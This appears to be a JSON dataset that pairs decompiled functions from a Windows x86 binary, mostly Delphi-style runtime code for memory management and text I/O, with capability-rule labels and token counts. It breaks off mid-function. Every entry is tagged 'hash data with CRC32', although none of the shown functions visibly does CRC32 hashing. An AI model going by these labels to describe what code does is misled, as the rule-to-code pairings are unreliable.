{
    "004013ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.004013ac(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0040167c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040167c(void)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x49371c;\n    if (*0x493720 == 0) {\n        return;\n    }\n    if ((*(*0x49371c + -4) & 1) == 0) {\n        *(*0x49371c + -4) = *(*0x49371c + -4) | 8;\n        piVar3 = iVar5 - *0x493720;\n        uVar4 = *0x493720;\n    }\n    else {\n        uVar4 = *(*0x49371c + -4) & 0xfffffff0;\n        if (0xb2f < uVar4) {\n            fcn.004015dc();\n            uVar4 = *(*0x49371c + -4) & 0xfffffff0;\n        }\n        piVar3 = *0x49371c - *0x493720;\n        uVar4 = uVar4 + *0x493720;\n    }\n    piVar3[-1] = uVar4 + 3;\n    *((uVar4 - 8) + piVar3) = uVar4;\n    if (uVar4 < 0xb30) {\n        return;\n    }\n    uVar4 = uVar4 - 0xb30 >> 8;\n    iVar5 = (uVar4 - 0x3ff & -(uVar4 < 0x3ff)) + 0x3ff;\n    uVar4 = iVar5 * 8;\n    ppiVar2 = *(uVar4 + 0x4937ac);\n    *piVar3 = uVar4 + 0x4937a8;\n    piVar3[1] = ppiVar2;\n    *ppiVar2 = piVar3;\n    *(uVar4 + 0x4937ac) = piVar3;\n    if (ppiVar2 != uVar4 + 0x4937a8) {\n        return;\n    }\n    uVar4 = uVar4 >> 8 & 0xff;\n    puVar1 = uVar4 * 4 + 0x493728;\n    *puVar1 = *puVar1 | 1 << (iVar5 & 0x1f);\n    *0x493724 = *0x493724 | 1 << (uVar4 & 0x1f);\n    return;\n}\n",
        "token_count": 567
    },
    "00401d80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00401d80(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t **in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **ppuVar6;\n    uint32_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint *puVar11;\n    uchar auStack32 [8];\n    uint uStack24;\n    uint8_t **ppuStack20;\n    \n    ppuVar8 = in_EAX[-1];\n    if ((ppuVar8 & 7) != 0) {\n        if ((ppuVar8 & 5) != 0) {\n            if ((ppuVar8 & 3) != 0) {\n                return -1;\n            }\n            ppuVar8 = in_EAX + -4;\n            fcn.00401760();\n            if ((in_EAX[-1] & 8) == 0) {\n                puVar11 = NULL;\n                iVar5 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000, *ppuVar8, in_EAX[-3]);\n                ppuVar6 = ppuVar8;\n                if (iVar5 == 0) {\n                    iVar5 = -1;\n                }\n                else {\n                    iVar5 = 0;\n                }\n            }\n            else {\n                uVar7 = in_EAX[-1] & 0xfffffff0;\n                iVar5 = 0;\n                while( true ) {\n                    sub.kernel32.dll_VirtualQuery(ppuVar8, &stack0xffffffe0);\n                    puVar11 = NULL;\n                    ppuVar6 = ppuVar8;\n                    iVar3 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000);\n                    if (iVar3 == 0) break;\n                    if (uVar7 < 0x1d) goto code_r0x00401887;\n                    uVar7 = uVar7 - 0x1c;\n                    ppuVar8 = ppuVar8 + 7;\n                }\n                iVar5 = -1;\n            }\ncode_r0x00401887:\n            if (iVar5 == 0) {\n                *puVar11 = ppuVar6;\n                ppuVar6[1] = puVar11;\n            }\n            *0x4957a8 = 0;\n            return iVar5;\n        }\n        goto code_r0x00401e81;\n    }\n    puVar9 = *ppuVar8;\n    ppuVar6 = in_EAX;\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar1 = *puVar9;\n            *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n            ppuVar6 = in_EAX;\n            if (uVar1 == 0) break;\n            if (*0x4935b5 == '\\0') {\n                in_EAX = NULL;\n                ppuStack20 = 0x401e1b;\n                ppuVar6 = ppuVar8;\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                uVar1 = *puVar9;\n                *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n                ppuVar8 = in_EAX;\n                if (uVar1 == 0) break;\n                ppuStack20 = 0xa;\n                uStack24 = 0x401e35;\n                sub.kernel32.dll_Sleep();\n                ppuVar8 = ppuStack20;\n            }\n        }\n    }\n    in_EAX = ppuVar8;\n    ppuVar8 = in_EAX + 3;\n    *ppuVar8 = *ppuVar8 + -1;\n    puVar4 = in_EAX[2];\n    if (*ppuVar8 != NULL) {\n        in_EAX[2] = ppuVar6;\n        ppuVar6[-1] = puVar4 + 1;\n        if (puVar4 != NULL) {\n            *puVar9 = 0;\n            return 0;\n        }\n        puVar4 = *(puVar9 + 4);\n        in_EAX[5] = puVar9;\n        in_EAX[1] = puVar4;\n        *(puVar4 + 0x14) = in_EAX;\n        *(puVar9 + 4) = in_EAX;\n        *puVar9 = 0;\n        return 0;\n    }\n    if (puVar4 == NULL) {\ncode_r0x00401de7:\n        *(puVar9 + 0xc) = puVar4;\n    }\n    else {\n        puVar4 = in_EAX[5];\n        puVar2 = in_EAX[1];\n        *(puVar4 + 4) = puVar2;\n        *(puVar2 + 0x14) = puVar4;\n        puVar4 = NULL;\n        if (*(puVar9 + 0x10) == in_EAX) goto code_r0x00401de7;\n    }\n    *puVar9 = puVar4;\n    ppuVar8 = in_EAX[-1];\ncode_r0x00401e81:\n    puVar9 = ppuVar8 & 0xfffffff0;\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar10 = *0x493718 == 0;\n            *0x493718 = *0x493718 ^ bVar10 * (*0x493718 ^ 1);\n            if (bVar10) break;\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar10 = *0x493718 == 0;\n                *0x493718 = *0x493718 ^ bVar10 * (*0x493718 ^ 1);\n                if (bVar10) break;\n                ppuStack20 = 0x401e73;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if ((*(puVar9 + -4 + in_EAX) & 1) == 0) {\n        *(puVar9 + -4 + in_EAX) = *(puVar9 + -4 + in_EAX) | 8;\n    }\n    else {\n        uVar7 = *(puVar9 + -4 + in_EAX) & 0xfffffff0;\n        puVar9 = puVar9 + uVar7;\n        if (0xb2f < uVar7) {\n            fcn.004015dc();\n        }\n    }\n    if ((*(in_EAX + -1) & 8) != 0) {\n        puVar4 = in_EAX[-2];\n        in_EAX = in_EAX - puVar4;\n        puVar9 = puVar9 + puVar4;\n        if (0xb2f < puVar4) {\n            fcn.004015dc();\n        }\n    }\n    if (puVar9 != 0x13ffe0) {\n        in_EAX[-1] = puVar9 + 3;\n        *(puVar9 + -8 + in_EAX) = puVar9;\n        fcn.0040161c();\n        *0x493718 = 0;\n        return 0;\n    }\n    if (*0x493720 == 0x13ffe0) {\n        ppuStack20 = in_EAX + -4;\n        puVar9 = *ppuStack20;\n        ppuVar8 = in_EAX[-3];\n        *(puVar9 + 4) = ppuVar8;\n        *ppuVar8 = puVar9;\n        *0x493718 = 0;\n        uStack24 = 0x401f2d;\n        iVar5 = sub.kernel32.dll_VirtualFree();\n        return -(iVar5 == 0);\n    }\n    fcn.0040167c();\n    in_EAX[0x4fff7] = 0x2;\n    *0x493718 = 0;\n    *0x49371c = in_EAX + 0x4fff8;\n    *0x493720 = 0x13ffe0;\n    return 0;\n}\n",
        "token_count": 1875
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402494": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402494(int32_t lpBuffer)\n\n{\n    uint32_t in_EAX;\n    \n    if ((0xffff < in_EAX) && ((in_EAX & 3) == 0)) {\n        if ((in_EAX < *(lpBuffer + -0x1c)) || (*(lpBuffer + -0x1c) + *(lpBuffer + -0x10) < in_EAX + 4)) {\n            *(lpBuffer + -0x10) = 0;\n            sub.kernel32.dll_VirtualQuery();\n        }\n        if ((((3 < *(lpBuffer + -0x10)) && (*(lpBuffer + -0xc) == 0x1000)) && ((*(lpBuffer + -8) & 0xf6) != 0)) &&\n           ((*(lpBuffer + -7) & 1) == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 205
    },
    "004026c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026c4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = arg_8h + -0x1b800 + (*in_EAX - 0x490044U >> 5) * 0x800;\n    fcn.00402324();\n    do {\n        if (var_1ch < var_18h) {\n            return;\n        }\n        if (((*(var_18h + -1) & 1) == 0) && (cVar3 = fcn.0040266c(),  cVar3 == '\\0')) {\n            *(arg_8h + -0x1b801) = 0;\n            iVar6 = 0;\n            iVar5 = fcn.00402590();\n            if (iVar5 == 0) {\n                if (((*var_18h < 0x100) && (var_20h = var_18h[1],  0 < var_20h)) && (var_20h <= *(*in_EAX + 2) - 0xd)) {\n                    var_10h = var_18h + 2;\n                    bVar4 = true;\n                    if (0 < var_20h) {\n                        do {\n                            if (((bVar4) && (0x1f < *var_10h)) && (*var_10h < 0x80)) {\n                                bVar4 = true;\n                            }\n                            else {\n                                bVar4 = false;\n                            }\n                            var_10h = var_10h + 1;\n                            var_20h = var_20h - 1;\n                        } while (var_20h != 0);\n                    }\n                    if ((bVar4) && (*var_10h == 0)) {\n                        iVar6 = 1;\n                    }\n                }\n            }\n            else {\n                iVar6 = 2;\n                do {\n                    if ((iVar5 == *(iVar2 + iVar6 * 8)) || (*(iVar2 + iVar6 * 8) == 0)) break;\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x100);\n                if (iVar6 < 0x100) {\n                    *(iVar2 + iVar6 * 8) = iVar5;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            piVar1 = iVar2 + 4 + iVar6 * 8;\n            *piVar1 = *piVar1 + 1;\n        }\n        var_18h = var_18h + *(*in_EAX + 2);\n    } while( true );\n}\n",
        "token_count": 669
    },
    "00402810": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00402810(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uchar auStackY131117 [2049];\n    int32_t aiStackY129068 [4096];\n    int32_t *piStackY112684;\n    uint16_t *puStackY112680;\n    int32_t iStackY112676;\n    int32_t iStackY112672;\n    int32_t iStackY112668;\n    int32_t iStackY112664;\n    int32_t iStackY112660;\n    char cStackY112654;\n    char cStackY112653;\n    int32_t iStackY112652;\n    char cStackY112645;\n    int32_t aiStackY110600 [26035];\n    uint var_4h;\n    \n    iVar3 = 0x27;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00403aac();\n    fcn.00403aac();\n    iStackY112652 = 0;\n    cStackY112645 = '\\x01';\n    for (iVar3 = *0x49370c; iVar4 = *0x4957b0,  iVar3 != 0x493708; iVar3 = *(iVar3 + 4)) {\n        iVar4 = fcn.004022e4();\n        while (iVar4 != 0) {\n            uVar1 = *(iVar4 + -4);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 4) == 0) {\n                    if (iStackY112652 < 0x1000) {\n                        iStackY112664 = (uVar1 & 0xfffffff0) - 4;\n                        cVar2 = fcn.0040266c();\n                        if (cVar2 == '\\0') {\n                            cStackY112645 = '\\0';\n                            aiStackY129068[iStackY112652] = iStackY112664;\n                            iStackY112652 = iStackY112652 + 1;\n                        }\n                    }\n                }\n                else {\n                    fcn.004026c4(&stack0xfffffffc);\n                }\n            }\n            iVar4 = fcn.004022c0();\n        }\n    }\n    while ((iVar4 != 0x4957ac && (iStackY112652 < 0x1000))) {\n        cVar2 = fcn.0040266c();\n        if (cVar2 == '\\0') {\n            cStackY112645 = '\\0';\n            aiStackY129068[iStackY112652] = (*(iVar4 + 0xc) & 0xfffffff0) - 0x14;\n            iStackY112652 = iStackY112652 + 1;\n        }\n        iVar4 = *(iVar4 + 4);\n    }\n    if (cStackY112645 == '\\0') {\n        cStackY112653 = '\\0';\n        iStackY112668 = 0;\n        puVar5 = fcn.0040247c();\n        iStackY112660 = 0x37;\n        puStackY112680 = 0x490046;\n        piStackY112684 = aiStackY110600;\n        do {\n            iStackY112672 = *puStackY112680 - 4;\n            cStackY112654 = '\\0';\n            iVar3 = 0xff;\n            piVar6 = piStackY112684;\n            do {\n                if (auStackY131117 < puVar5) break;\n                if (*piVar6 != 0) {\n                    if (cStackY112653 == '\\0') {\n                        puVar5 = fcn.0040247c();\n                        cStackY112653 = '\\x01';\n                    }\n                    if (cStackY112654 == '\\0') {\n                        *puVar5 = 0xd;\n                        puVar5[1] = 10;\n                        puVar5 = fcn.00402360();\n                        *puVar5 = 0x20;\n                        puVar5[1] = 0x2d;\n                        puVar5[2] = 0x20;\n                        fcn.00402360();\n                        fcn.0040247c();\n                        cStackY112654 = '\\x01';\n                    }\n                    else {\n                        *puVar5 = 0x2c;\n                        puVar5[1] = 0x20;\n                    }\n                    if (iVar3 == 0) {\n                        puVar5 = fcn.0040247c();\n                    }\n                    else if (iVar3 == 1) {\n                        puVar5 = fcn.0040247c();\n                    }\n                    else {\n                        fcn.00404520();\n                        puVar5 = fcn.0040247c();\n                    }\n                    *puVar5 = 0x20;\n                    puVar5[1] = 0x78;\n                    puVar5[2] = 0x20;\n                    puVar5 = fcn.00402360();\n                }\n                iVar3 = iVar3 + -1;\n                piVar6 = piVar6 + -2;\n            } while (iVar3 != -1);\n            iStackY112668 = iStackY112672;\n            piStackY112684 = piStackY112684 + 0x200;\n            puStackY112680 = puStackY112680 + 0x10;\n            iStackY112660 = iStackY112660 + -1;\n        } while (iStackY112660 != 0);\n        if (0 < iStackY112652) {\n            if (cStackY112653 != '\\0') {\n                *puVar5 = 0xd;\n                puVar5[1] = 10;\n                puVar5[2] = 0xd;\n                puVar5[3] = 10;\n            }\n            puVar5 = fcn.0040247c();\n            iStackY112676 = 0;\n            iVar3 = iStackY112652;\n            do {\n                if (iStackY112676 != 0) {\n                    *puVar5 = 0x2c;\n                    puVar5[1] = 0x20;\n                }\n                puVar5 = fcn.00402360();\n                if (auStackY131117 < puVar5) break;\n                iStackY112676 = iStackY112676 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.0040247c();\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 1479
    },
    "00403a74": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00403a74(void)\n\n{\n    char extraout_AH;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) == -0x284f) && (*(in_EAX + 0xc) < *(in_EAX + 0x10))) {\n        if (((*(in_EAX + 6) & 1) == 0) || (*(*(in_EAX + 0xc) + *(in_EAX + 0x14)) != '\\x1a')) {\n            return 0;\n        }\n    }\n    else {\n        fcn.00403b84();\n        if (extraout_AH != '\\x1a') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 190
    },
    "00403b84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00403b84(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 4) != -0x284f) {\n        cVar2 = fcn.00403b48();\n        if (cVar2 == '\\0') goto code_r0x00403be6;\n    }\n    uVar4 = *(in_EAX + 0xc);\n    if (*(in_EAX + 0x10) <= uVar4) {\n        iVar3 = (**(in_EAX + 0x1c))();\n        if (iVar3 != 0) {\n            fcn.0040306c();\n            goto code_r0x00403be6;\n        }\n        uVar4 = *(in_EAX + 0xc);\n        if (*(in_EAX + 0x10) <= uVar4) {\n            if ((*(in_EAX + 6) & 1) != 0) {\n                *(uVar4 + *(in_EAX + 0x14)) = 0x1a;\n                *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n            }\n            goto code_r0x00403be6;\n        }\n    }\n    uVar1 = *(uVar4 + *(in_EAX + 0x14));\n    if (((*(in_EAX + 6) & 1) == 0) || (uVar1 != 0x1a)) {\n        *(in_EAX + 0xc) = uVar4 + 1;\n        return uVar1;\n    }\ncode_r0x00403be6:\n    return CONCAT31(CONCAT21(in_EAX >> 0x10, 0x1a), 0x1a);\n}\n",
        "token_count": 420
    },
    "00403bf0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403bf0(int32_t param_1, char *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar6;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    int32_t iVar5;\n    \n    iVar7 = param_1;\n    if (((*(in_EAX + 4) == -0x284f) || (cVar2 = fcn.00403b48(),  cVar2 != '\\0')) && (unaff_EBX = in_EAX,  0 < param_1))\n    {\n        puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n        do {\n            while( true ) {\n                iVar4 = iVar5 + -1;\n                if (iVar5 < 1) {\n                    *(in_EAX + 0xc) = puVar6;\n                    uVar3 = fcn.00403b84(iVar7);\n                    iVar4 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n                    puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n                    if (uVar3 >> 8 != '\\0') {\n                        return in_EAX;\n                    }\n                }\n                else {\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                }\n                cVar2 = uVar3;\n                if (cVar2 == '\\n') goto code_r0x00403c44;\n                iVar5 = iVar4;\n                if (cVar2 == '\\r') break;\n                if ((cVar2 == '\\x1a') && ((*(in_EAX + 6) & 1) != 0)) goto code_r0x00403c45;\n                *param_2 = cVar2;\n                iVar4 = param_1 + -1;\n                bVar1 = param_1 < 1;\n                param_1 = iVar4;\n                param_2 = param_2 + 1;\n                if (iVar4 == 0 || bVar1) goto code_r0x00403c45;\n            }\n        } while (*puVar6 != 10);\ncode_r0x00403c44:\n        puVar6 = puVar6 + -1;\ncode_r0x00403c45:\n        *(in_EAX + 0xc) = puVar6 - *(in_EAX + 0x14);\n    }\n    return unaff_EBX;\n}\n",
        "token_count": 615
    },
    "0040409c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0040409c(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uStack12;\n    \n    if ((*(in_EAX + 6) & 1) == 0) {\n        uStack12 = CONCAT31(param_1 >> 8, 10);\n        uVar1 = fcn.00403fcc();\n    }\n    else {\n        uStack12 = param_1 & 0xffff0000 | 0xa0d;\n        uVar1 = fcn.00403fcc();\n    }\n    fcn.00403820();\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 160
    },
    "0040a8a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t * __fastcall fcn.0040a8a0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint16_t *puVar3;\n    \n    param_2 = param_2 - in_EAX;\n    puVar3 = in_EAX;\n    if ((in_EAX & 1) != 0) {\n        cVar1 = *(param_2 + in_EAX);\n        *in_EAX = cVar1;\n        if (cVar1 == '\\0') {\n            return in_EAX;\n        }\n        puVar3 = in_EAX + 1;\n    }\n    do {\n        if (*(param_2 + puVar3) == '\\0') {\n            *puVar3 = '\\0';\n            return in_EAX;\n        }\n        uVar2 = *(param_2 + puVar3);\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n    } while (0xff < uVar2);\n    return in_EAX;\n}\n",
        "token_count": 246
    },
    "0040eeb8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eeb8(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x40f001;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if ((arg_ch & 2) == 0) {\n        fcn.00405504();\n        fcn.00405504();\n    }\n    else {\n        puStack48 = &stack0xfffffffc;\n        fcn.00409a20();\n        fcn.00409a20();\n    }\n    fcn.00405504();\n    fcn.0040546c();\n    do {\n        if (var_4h == 0) {\ncode_r0x0040efde:\n            *in_FS_OFFSET = puStack56;\n            puStack48 = 0x40f008;\n            uStack52 = 0x40eff3;\n            fcn.0040546c();\n            uStack52 = 0x40f000;\n            fcn.00405490();\n            return;\n        }\n        iVar1 = fcn.0040e840();\n        if (iVar1 == 0) {\n            fcn.00405738();\n            goto code_r0x0040efde;\n        }\n        fcn.00405964(&fcn.0040eeb8::var_1ch, *arg_8h);\n        fcn.00405800(var_14h, var_1ch);\n        fcn.00405964(&fcn.0040eeb8::var_ch);\n        if ((arg_ch & 1) == 0) {\n            fcn.00405738();\n            goto code_r0x0040efde;\n        }\n        var_18h = var_8h;\n        if (var_8h != 0) {\n            var_18h = *(var_8h + -4);\n        }\n        puStack56 = &fcn.0040eeb8::var_4h;\n        fcn.00405964();\n    } while( true );\n}\n",
        "token_count": 595
    },
    "0041d26c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d26c(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 71
    },
    "0041d540": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d540(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x41d764;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41d576;\n    (**(*in_EAX + 0x28))();\n    puStack72 = 0x41d581;\n    fcn.0041e8b4();\n    puStack72 = 0x41d58c;\n    fcn.0041e8b4();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x41d734;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x41d5cd;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d2ec(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x41d5c4;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d49c(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x41d6f2;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.0041d18c(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.0041d204(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.0041d3fc(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00404f60();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41d76b;\n            uStack76 = 0x41d755;\n            fcn.00405490();\n            uStack76 = 0x41d763;\n            fcn.00406a20();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.0041d204(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.0041d204(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.0040483c();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.0041d150(&stack0xfffffffc);\n            fcn.00419680();\n        }\n        else {\n            iVar3 = fcn.00419834();\n            if (iVar3 < 0) {\n                fcn.0041d150(&stack0xfffffffc);\n                fcn.00419680();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1023
    },
    "0041fa90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0041fa90(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.004198c0();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x41fae8 != (*0x41fae8 & *(in_EAX + 0x1c)))) {\n            fcn.0041f9cc();\n        }\n        else {\n            fcn.0041fa58();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00423fb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004240a1)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00423fb0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStackY148;\n    int32_t iStack120;\n    uint uStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack100 = &stack0xfffffffc;\n    uStack104 = 0x4241cc;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) != 0) {\n        *in_FS_OFFSET = iStack108;\n        puStack100 = 0x4241d3;\n        uStack104 = 0x4241cb;\n        fcn.00405490();\n        return;\n    }\n    puStack112 = 0x423ff4;\n    fcn.00423290();\n    uStack116 = 0x4241a4;\n    iStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    if (*(var_4h + 8) == 0) {\n        var_40h = *(var_4h + 0x14);\n        var_3ch = 0;\n        var_38h = *(var_4h + 0x18);\n        if ((*(var_4h + 0x1d) & 1) == 0) {\n            var_30h = 400;\n        }\n        else {\n            var_30h = 700;\n        }\n        var_2ch._0_1_ = (*(var_4h + 0x1d) & 2) != 0;\n        var_2ch._1_1_ = (*(var_4h + 0x1d) & 4) != 0;\n        var_2ch._2_1_ = (*(var_4h + 0x1d) & 8) != 0;\n        var_2ch._3_1_ = *(var_4h 